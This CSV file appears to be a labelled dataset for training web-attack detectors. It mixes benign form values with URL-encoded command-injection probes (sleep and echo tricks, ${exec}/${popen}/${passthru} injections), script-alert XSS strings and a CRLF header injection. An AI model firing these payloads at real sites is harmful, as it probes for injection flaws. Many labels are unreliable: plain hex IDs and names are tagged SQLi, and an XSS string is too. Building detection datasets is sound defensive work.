payload,label,source
5527948175762743,Normal,csic_gsi:cisc_normalTraffic_train.txt
bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org,XSS,csic_gsi:cisc_anomalousTraffic_test.txt
BA72E0AFBB70BB8BA1BCB53BD38C716E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
718C387E63FFB0FBE7AEE776C51251F7,Normal,csic_gsi:cisc_normalTraffic_test.txt
4A269D3E469048F8A684B3E13205CBD4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20STITDI%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,CMD,seclists_cmd
BBA67D1BEFD24481C8AC1652B3E50CF9,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""&echo$IFSIZIKXP$((4%2B56))$(echo$IFSIZIKXP)IZIKXP%5C%5C",CMD,seclists_cmd
50637,Normal,csic_gsi:cisc_normalTraffic_test.txt
krummell,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20DRVINS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
5AFAD11291DB61B0A5D554CB2B5B0D23,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"<SCR%00IPT>alert(\""XSS\"")</SCR%00IPT>",SQLi,community:payloads_seed
09043A3953C2507E77D2006B5B27B1BB,Normal,csic_gsi:cisc_normalTraffic_train.txt
75925253E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
jourdan@bijoubijoudiferente.cat,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
40190,Normal,csic_gsi:cisc_normalTraffic_train.txt
3939CF537997CBE5435F86DE79130E71,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombre=Queso+Manchego&precio=85&cantidad=61&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
echo%20ZUXLTJ$((16%2B69))$(echo%20ZUXLTJ)ZUXLTJ\,CMD,seclists_cmd
caruth5@wave.com.pt,Normal,csic_gsi:cisc_normalTraffic_train.txt
81192846V,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%204%20-ne%20%24%28echo%20RZSNER%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,CMD,seclists_cmd
|echo$IFSBHTKLO$((25%2B57))$(echo$IFSBHTKLO)BHTKLO\,CMD,seclists_cmd
6C597DB888C36E6A2666DF452CDA7B44,Normal,csic_gsi:cisc_normalTraffic_train.txt
dai-line@gay-tantra.ma,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
pakulski,Normal,csic_gsi:cisc_normalTraffic_train.txt
enenconcharse,Normal,csic_gsi:cisc_normalTraffic_train.txt
E3BB05FD52F5F6EFC180018FFFDF4681,Normal,csic_gsi:cisc_normalTraffic_train.txt
B0FEC30121BB3549CF636294C9E86984,Normal,csic_gsi:cisc_normalTraffic_train.txt
5011039662886040,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
leon,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20IFMAPS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%27,CMD,seclists_cmd
'%0aecho$IFSMOMQCI$((63%2B38))$(echo$IFSMOMQCI)MOMQCI%7C,CMD,seclists_cmd
%27%7C%20%5B%206%20-ne%20%24%28echo%20JEORXY%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
24806506V,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%201%20-ne%20%24%28echo%20SKWMFK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
3A63A8D27E8BDAF742EDAA9DA7A1AB42,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1BE03BD6397120B329E024E0E3440893,Normal,csic_gsi:cisc_normalTraffic_test.txt
3796EBF320E4B17A697F0AA4B35E8F32,Normal,csic_gsi:cisc_normalTraffic_test.txt
4EFE1D3AF5FF535FDAD90ACCCF47C336,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'961066AD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
breanne,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Urbanizacion+Montesion,+3+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%0A%20str%3D%24%28echo%20YQOMCI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
91B090B0482A8BE08EA53C4F860F46E0,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZEPVFU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
7CCA42F2336C0AA08C0692663905FB5A,Normal,csic_gsi:cisc_normalTraffic_test.txt
Plaza+Doctor+Quemada+88+8-H%00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
27A9F0A5406394B0B330BBE4682D5D35,Normal,csic_gsi:cisc_normalTraffic_test.txt
Av.+Juan+De+Austria+143+3?D,Normal,csic_gsi:cisc_normalTraffic_test.txt
8DBC51A3ED1B8AECAE23659BC30EBF34,Normal,csic_gsi:cisc_normalTraffic_train.txt
158C6913D9F8C3FCF9BF31A2A95449BA,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%3B%20str%3D%24%28echo%20IVNSBH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,CMD,seclists_cmd
108,Normal,csic_gsi:cisc_normalTraffic_train.txt
48395550P,Normal,csic_gsi:cisc_normalTraffic_test.txt
A35E71523B9D6C843BC4780F862B26F0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2930D768E1EB3C874170C534ABF9F904,Normal,csic_gsi:cisc_normalTraffic_train.txt
5764A0C3F90E2A45DD0E8461EA9394C2,Normal,csic_gsi:cisc_normalTraffic_test.txt
57023538Y,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Otilia,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calle+Obispo+Gonzalez+De+Toro+S/N,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20BFQFHB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
8093605CD34235DC52B4581CD1AE54E4,Normal,csic_gsi:cisc_normalTraffic_train.txt
3D73D12FA05806378713A727E2C18438,Normal,csic_gsi:cisc_normalTraffic_test.txt
26339,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"&echo%20TGYKVF$((42%2B14))$(echo%20TGYKVF)TGYKVF""",CMD,seclists_cmd
"modo=registro&login=snedeker&password=74ain7l&nombre=Lihu�n&apellidos=Garabana+Belart&email=brana@housemovie.id&dni=80937614Q&direccion=Banquilla,+171,+&ciudad=Sant+Vicen�+de+Castellet&cp=46179&provincia=M�laga&ntc=7500539436342438&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
8884,Normal,csic_gsi:cisc_normalTraffic_test.txt
0AA0604527A868434D7E53B2036BD18B,Normal,csic_gsi:cisc_normalTraffic_train.txt
%20echo%20JDCGXZ$((41%2B96))$(echo%20JDCGXZ)JDCGXZ%26,CMD,seclists_cmd
%2527%3B%20str%3D%24%28echo%20NSSNST%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C,CMD,seclists_cmd
waldhorn_fregues@prensahp.sn,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=2051&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26echo%20CFQNOE$((61%2B46))$(echo%20CFQNOE)CFQNOE,CMD,seclists_cmd
4001707460771803,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
63B1A5F75A14CAC02A43A8696120AEE4,Normal,csic_gsi:cisc_normalTraffic_train.txt
92C4EB349AEAD79E6DC922869E72980F,Normal,csic_gsi:cisc_normalTraffic_test.txt
bogarde4@tiendasyofertas.museum,Normal,csic_gsi:cisc_normalTraffic_train.txt
5749D74A4C4927C4017267430F0F87C6,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5C71473E872AC622717713F44E9F422B,Normal,csic_gsi:cisc_normalTraffic_test.txt
65F7CE6CDCB421B32D172E563B549BF0,Normal,csic_gsi:cisc_normalTraffic_test.txt
3E75ED767B5DF40C48C1D64C1B1BB60F,Normal,csic_gsi:cisc_normalTraffic_train.txt
Sequia+103+,Normal,csic_gsi:cisc_normalTraffic_test.txt
&&echo%20MKGYYL$((46%2B31))$(echo%20MKGYYL)MKGYYL%5C%5C,CMD,seclists_cmd
0C2A9A3D2E392C5E987445F56A592208,Normal,csic_gsi:cisc_normalTraffic_test.txt
Ta�s,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3C2BBC80FA912ED011FA6691718D6B1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
4DF823988729871E2EBA545749A3C9E4,Normal,csic_gsi:cisc_normalTraffic_test.txt
0D21F9BFB27C634D5B4044F2BB36FBB7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A7F0BDC5C0081ADCFEB9793210FD5DFD,Normal,csic_gsi:cisc_normalTraffic_train.txt
56BB03D64628E57EE2E395C14D140066,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%3B%20str%3D%24%28echo%20AUJGTN%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
id=2&nombre=Jam�n+Ib�rico&precio=85&cantidad=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20JTPWXS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
0748319C3527C57A827A97E17470E53E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
09572,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0446D39D4C7C7026226F60327BEABC33,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Sennacherribbo+Castelan,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
38E8F049130EB044E1D587F0DF5CD519,Normal,csic_gsi:cisc_normalTraffic_test.txt
04F083394D3AC301607A7512F6DF4728,Normal,csic_gsi:cisc_normalTraffic_train.txt
c3763ativa.m4n3e,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'.print(`echo%20DWVXEQ;echo%20$((13%2B19));echo%20DWVXEQ;echo%20DWVXEQ`)%3B%2523DWVXEQ,CMD,seclists_cmd
modo=insertar%7C&precio=6771&B1=Pasar+por+caja,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
||echo%20ZSBSMD$((90%2B5))$(echo%20ZSBSMD)ZSBSMD//,CMD,seclists_cmd
504B631AF66617587B0ECF60130F952F,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombre=Queso+Manchego&precio=85&cantidad=6&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20QTRMRJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
7024918540973284,Normal,csic_gsi:cisc_normalTraffic_train.txt
modoA=insertar&precio=5320&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
${exec(print(`echo%20SRPMSX`.`echo%20$((59%2B33))`.`echo%20SRPMSX`.`echo%20SRPMSX`)%29%7DSRPMSX,CMD,seclists_cmd
3B330853E791CD7D9D9A78A394D58CAE,Normal,csic_gsi:cisc_normalTraffic_test.txt
86640216K,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=ca+ri+ta&password=import!ador&nombre=Leinad&apellidos=Alabart&email=koyama@civicosdns.jp&dni=19113499Q&direccion=C/+Silvinita+95,+11D&ciudad=Cordobilla+de+L�cara&cp=16800&provincia=Cuenca&ntc=9775185207171671&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Maslo+Arrunategui,Normal,csic_gsi:cisc_normalTraffic_test.txt
C774799794403774210DD57E8A2D09C3,Normal,csic_gsi:cisc_normalTraffic_train.txt
&&echo%20YHOOON$((42%2B16))$(echo%20YHOOON)YHOOON//,CMD,seclists_cmd
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20HBIFJL%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26,CMD,seclists_cmd
46289E53AF1A67E13DF68D1C3070C3F1,Normal,csic_gsi:cisc_normalTraffic_test.txt
DD15C79278DBF3007A8A683E93288027,Normal,csic_gsi:cisc_normalTraffic_test.txt
Celia,Normal,csic_gsi:cisc_normalTraffic_train.txt
Valle+Gran+Rey,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D95A15477B57C060EB54F06B3AD58EEE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
seagrove,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1737,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
18100,Normal,csic_gsi:cisc_normalTraffic_train.txt
Vich+Bov�,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=currey99&password=02ap36O5473&nombre=Teresa&apellidos=Vi�es+Canales&email=fazenda_heigh@unanuevavisionenortodoncia.gh&dni=90179643R&direccion=Dels+Segons+Jocs+Mediterranis+86,+3-H&ciudad=Casarejos&cp=13750&provincia=Teruel&ntc=7548043709154269&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
909B766CA8AE4FDFAE756501824BDAAF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
57073625E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
intuitivo,Normal,csic_gsi:cisc_normalTraffic_train.txt
709ABE08DDA35CA838D398E84FE1A897,Normal,csic_gsi:cisc_normalTraffic_train.txt
5CB11A1B281157DD23EB5B5FED419299,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=chihchie&pwd=s927r�9i0o&remember=off&B1A=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AFE5CFC400F0771EDB0CDBC218A85447,Normal,csic_gsi:cisc_normalTraffic_train.txt
Zamay�n,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26echo$IFSOVSHWQ$((85%2B7))$(echo$IFSOVSHWQ)OVSHWQ%5C%5C,CMD,seclists_cmd
10189,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Casas+Bajas,Normal,csic_gsi:cisc_normalTraffic_test.txt
6396F7B0F3C788678B171C755E3E830D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
39F2FD3CABE6269E1148A583D9C388C2,Normal,csic_gsi:cisc_normalTraffic_train.txt
Calle+Nu�ez+De+Balboa+179+,Normal,csic_gsi:cisc_normalTraffic_test.txt
johnson@obelix.info,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""%0aecho$IFSRSKGDD$((67%2B8))$(echo$IFSRSKGDD)RSKGDD%2F%2F",CMD,seclists_cmd
'+theolog'o,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%3B%20str%3D%24%28echo%20ZGYOBQ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
${popen(print(`echo%20QDXUDJ\necho%20$((17%2B75))\necho%20QDXUDJ\necho%20QDXUDJ`)%3B%25252529%2525257DQDXUDJ,CMD,seclists_cmd
6222371193056945,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9029322975173730,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20RPPEVG%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,CMD,seclists_cmd
7619192104254644,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1515784011485663,Normal,csic_gsi:cisc_normalTraffic_test.txt
6708DB240510380B33128FEC9B866266,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
80053C493A44E45783EE1A9027CA735C,Normal,csic_gsi:cisc_normalTraffic_train.txt
44367,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0aecho%20JXLHHG$((94%2B73))$(echo%20JXLHHG)JXLHHG%26,CMD,seclists_cmd
8516B17C51FA76017D9C4C3A5ED1A7AE,Normal,csic_gsi:cisc_normalTraffic_test.txt
294D89E4623B9065E1A3DDCAEE709AA1,Normal,csic_gsi:cisc_normalTraffic_test.txt
06175,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Dos+Aceras+119,+",Normal,csic_gsi:cisc_normalTraffic_train.txt
2BD3133B512077CD3DAFE5095BB0ED22,Normal,csic_gsi:cisc_normalTraffic_test.txt
A81E69E3B7651F59099135518B480FF9,Normal,csic_gsi:cisc_normalTraffic_test.txt
3C5DA20B59BE4E41CC4D2572B6E1C630,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=barlas&password=zapatEar&nombre=Idefonsa&apellidos=Malapeir+Cavaller&email=buchel-alymer@gemas.org.bu&dni=30097796L&direccion=Calle+San+Lazaro,+115,+4-B&ciudad=Magaz+de+Pisuerga&cp=23710&provincia=Barcelona&ntc=0646137347424943&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
4A3095D7F1041E8B4A34932C5E2C0645,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F1DF9BACBAE96B93D0D4C72D5D1D395F,Normal,csic_gsi:cisc_normalTraffic_train.txt
3346B89E947DDDB61F0E89192B3D8042,Normal,csic_gsi:cisc_normalTraffic_train.txt
C99C8FA128627E447B0085C64B3D8DA8,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%0A%20str%3D%24%28echo%20YQOMCI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
4508,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Molina,Normal,csic_gsi:cisc_normalTraffic_train.txt
Ignolinda,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B92A8DEA0DB87B59F135B87396278FD8,Normal,csic_gsi:cisc_normalTraffic_train.txt
1449C1E7B4536FA4EC2DA175E55DEC4C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2C810494871F04866A73C2694AF680D0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2EF3D017ED0941720201DEC27F4151F8,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%208%20-ne%20%24%28echo%20FATRPK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
Colobran+Rebull,Normal,csic_gsi:cisc_normalTraffic_train.txt
B07E19BBC8BF39B499DBFF92E3C764EE,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20ZNGHTM%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
A1D875A4F87C2CDB1C30C3910226B8BE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
702C679DE42F144D9E89F4656017913C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26echo$IFSZNUBXF$((96%2B1))$(echo$IFSZNUBXF)ZNUBXF//,CMD,seclists_cmd
CCB5D214C811E47AC46E3AC916580A7C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ACDB31D31CB137896C844A5F63D46EBD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
a_ma6ar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
22234,Normal,csic_gsi:cisc_normalTraffic_train.txt
434921604510901A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ED7EA029952D66BD7A0AE68592A654CB,Normal,csic_gsi:cisc_normalTraffic_train.txt
c9pr1o,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""&echo%20CYVXHL$((2%2B25))$(echo%20CYVXHL)CYVXHL",CMD,seclists_cmd
shigenao,Normal,csic_gsi:cisc_normalTraffic_test.txt
38FFF28DF8CE5A94BCD3A3193C09DA33,Normal,csic_gsi:cisc_normalTraffic_test.txt
EA0C4C720A64079909C93076966B059D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9BEDABCB317EEBBF1C5258CB86CAEC3F,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%203%20-ne%20%24%28echo%20SKWMFK%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
D134C248532AAD885A6B554A6D992576,Normal,csic_gsi:cisc_normalTraffic_train.txt
tOzO,Normal,csic_gsi:cisc_normalTraffic_test.txt
'%0aecho%20IMHMUF$((78%2B85))$(echo%20IMHMUF)IMHMUF%5C%5C,CMD,seclists_cmd
"modoA=registro&login=yurchuk&password=afRAnCeSar&nombre=Dalinda&apellidos=Tiviroli+Xaubet&email=argo.freyndikh@sanchezgordo.lc&dni=67911701S&direccion=Eivissa,+47+&ciudad=Fonzaleche&cp=47463&provincia=Ourense&ntc=1677358108107194&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8D3286D2837D76CE4AB6A5645F670C9D,Normal,csic_gsi:cisc_normalTraffic_test.txt
9E21AF22A316FD4EE60DE18A33351C01,Normal,csic_gsi:cisc_normalTraffic_test.txt
Bordas+Rubies,Normal,csic_gsi:cisc_normalTraffic_test.txt
9633,Normal,csic_gsi:cisc_normalTraffic_test.txt
&&echo%20ELOSZQ$((77%2B50))$(echo%20ELOSZQ)ELOSZQ|,CMD,seclists_cmd
Mogarraz,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"C/+Santa+Florentina+9,+11?H",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
${passthru(print(`echo%20QPYRBQ\necho%20$((35%2B79))\necho%20QPYRBQ\necho%20QPYRBQ`)%3B%25252523QPYRBQ,CMD,seclists_cmd
96068417Q,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20RIIZGU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%27,CMD,seclists_cmd
41A342EFEBBB7B75EE8C269C7322764D,Normal,csic_gsi:cisc_normalTraffic_train.txt
C38780BBD4F3D8DD9EF3B40B02247F3A,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=dido&password=i,nt32n/1773n'02a&nombre=Bertilda&apellidos=Deverdun&email=low.feliciano@azkara.sj&dni=19110618X&direccion=Prolongacion+Algeciras+169,+&ciudad=Navarredonda+de+Gredos&cp=18418&provincia=Navarra&ntc=1628195660765454&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
totino,Normal,csic_gsi:cisc_normalTraffic_train.txt
3972,Normal,csic_gsi:cisc_normalTraffic_train.txt
9873ADD34C3D18010CE3C1962C79C1A1,Normal,csic_gsi:cisc_normalTraffic_train.txt
3441288E12DDF14C6660D08B5E1F8E51,Normal,csic_gsi:cisc_normalTraffic_train.txt
Chozas+de+Abajo,Normal,csic_gsi:cisc_normalTraffic_test.txt
d8eci78e88a1a,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=kerschne7&password=7?u33dabo7qu1&nombre=Freddy&apellidos=Menocal&email=hirt@superstarsgroup.pt&dni=41132172F&direccion=C/+Pau+Casals+63,+&ciudad=Carcastillo&cp=49610&provincia=Navarra&ntc=7246879991228757&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
7C16B83FF65F5FF5795F6205A72B456F,Normal,csic_gsi:cisc_normalTraffic_test.txt
349843A21803647FCBEDD2C679E4558C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8D9B8021E02B581590BC699857D6098F,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%7C%20%5B%207%20-ne%20%24%28echo%20NWPDIX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
035B28C6FDC155BFCA515977A47B06C1,Normal,csic_gsi:cisc_normalTraffic_train.txt
3BAF347E2D2F438F077BF1A989A0961E,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%0A%20str%3D%24%28echo%20VYCNRP%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22,CMD,seclists_cmd
71648159P,Normal,csic_gsi:cisc_normalTraffic_train.txt
reardon@tvup.jo,Normal,csic_gsi:cisc_normalTraffic_test.txt
Confirmarany%0ASet-cookie%3A+Tamper%3D1041264011025374727,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
FFABE40B259D3BB1AA8AC9D1F4D2CA20,Normal,csic_gsi:cisc_normalTraffic_train.txt
33293484H,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
92B861FD265D035394513EC42A35C5EA,Normal,csic_gsi:cisc_normalTraffic_train.txt
Pomponio,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Colldevall,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modoA=entrar&login=fargo&pwd=engolfa&remember=off&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1B06514FBF5EDE88520AC2562F7967E3,Normal,csic_gsi:cisc_normalTraffic_train.txt
